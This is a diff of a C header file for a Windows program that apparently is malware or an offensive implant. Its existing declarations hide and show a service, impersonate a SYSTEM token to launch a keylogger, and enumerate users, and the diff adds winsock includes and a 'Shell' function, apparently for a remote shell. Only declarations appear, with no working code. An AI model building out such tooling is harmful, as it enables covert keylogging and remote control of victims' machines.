@@ -1,6 +1,7 @@
 #pragma once
 #pragma warning(disable: 4820)
 #define WIN32_LEAN_AND_MEAN
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <windows.h>
 
 #include <sddl.h>
@@ -8,10 +9,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <tlhelp32.h>
+#include <winsock2.h>
 #include <winternl.h>
+#include <ws2tcpip.h>
 #include <wtsapi32.h>
 
 #include "consts.h"
+
 
 #define REEF(x){ if (x){ free(x); x = NULL;}}
 
@@ -31,6 +35,7 @@ VOID DeleteSvc(SC_HANDLE SCManager);
 VOID UpdateSvc(SC_HANDLE SCManager);
 VOID HideSvc(SC_HANDLE SCManager);
 VOID ShowSvc(SC_HANDLE SCManager);
+VOID Shell(void);
 
 VOID ImpersonateSystemTokenAndLaunchKeylogger(LPPROCESS_INFORMATION keylogInfo, DWORD sessionID);
 VOID PrintUserNameByProc(void);
